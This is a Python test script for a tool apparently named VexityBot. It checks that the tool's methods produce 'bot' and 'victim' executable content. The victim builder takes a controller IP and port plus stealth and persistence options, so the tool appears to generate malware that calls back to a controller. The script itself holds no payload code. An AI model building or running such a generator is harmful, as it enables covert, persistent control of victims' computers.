#!/usr/bin/env python3
"""
Test script to verify both Bot EXE and Victim EXE creation methods work
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from main_gui import VexityBotGUI
import tkinter as tk

def test_bot_exe_creation():
    """Test Bot EXE creation functionality"""
    print("🧪 Testing Bot EXE Creation...")
    
    # Create a minimal GUI instance
    root = tk.Tk()
    root.withdraw()  # Hide the window
    
    try:
        app = VexityBotGUI(root)
        
        # Test multi-bomb content creation
        selected_bombs = ["quantum", "plasma", "neutron"]
        content = app.create_multi_bomb_executable_content(selected_bombs)
        
        if content and len(content) > 1000:
            print("✅ Bot EXE content creation: SUCCESS")
            print(f"   - Content length: {len(content)} characters")
            print(f"   - Contains bomb types: {selected_bombs}")
            return True
        else:
            print("❌ Bot EXE content creation: FAILED")
            return False
            
    except Exception as e:
        print(f"❌ Bot EXE creation error: {str(e)}")
        return False
    finally:
        root.destroy()

def test_victim_exe_creation():
    """Test Victim EXE creation functionality"""
    print("🧪 Testing Victim EXE Creation...")
    
    # Create a minimal GUI instance
    root = tk.Tk()
    root.withdraw()  # Hide the window
    
    try:
        app = VexityBotGUI(root)
        
        # Test victim EXE content creation
        controller_ip = "192.168.1.100"
        controller_port = 8080
        exe_name = "test_victim"
        stealth_mode = True
        auto_start = False
        persistence = True
        selected_bots = [
            {"name": "AlphaBot", "status": "Online", "rank": 1, "port": 8101, "uptime": "2h 30m", "requests": 1500},
            {"name": "BetaBot", "status": "Online", "rank": 2, "port": 8102, "uptime": "1h 45m", "requests": 1200}
        ]
        
        content = app.create_victim_exe_content(
            controller_ip, controller_port, exe_name, 
            stealth_mode, auto_start, persistence, selected_bots
        )
        
        if content and len(content) > 1000:
            print("✅ Victim EXE content creation: SUCCESS")
            print(f"   - Content length: {len(content)} characters")
            print(f"   - Controller: {controller_ip}:{controller_port}")
            print(f"   - Selected bots: {len(selected_bots)}")
            return True
        else:
            print("❌ Victim EXE content creation: FAILED")
            return False
            
    except Exception as e:
        print(f"❌ Victim EXE creation error: {str(e)}")
        return False
    finally:
        root.destroy()

def main():
    """Run all tests"""
    print("🚀 VexityBot EXE Creation Test Suite")
    print("=" * 50)
    
    # Test Bot EXE creation
    bot_success = test_bot_exe_creation()
    print()
    
    # Test Victim EXE creation
    victim_success = test_victim_exe_creation()
    print()
    
    # Summary
    print("📊 Test Results Summary:")
    print("=" * 30)
    print(f"Bot EXE Creation: {'✅ PASS' if bot_success else '❌ FAIL'}")
    print(f"Victim EXE Creation: {'✅ PASS' if victim_success else '❌ FAIL'}")
    
    if bot_success and victim_success:
        print("\n🎉 All tests passed! Both EXE creation methods are working correctly.")
        return 0
    else:
        print("\n⚠️  Some tests failed. Please check the errors above.")
        return 1

if __name__ == "__main__":
    exit_code = main()
    sys.exit(exit_code)
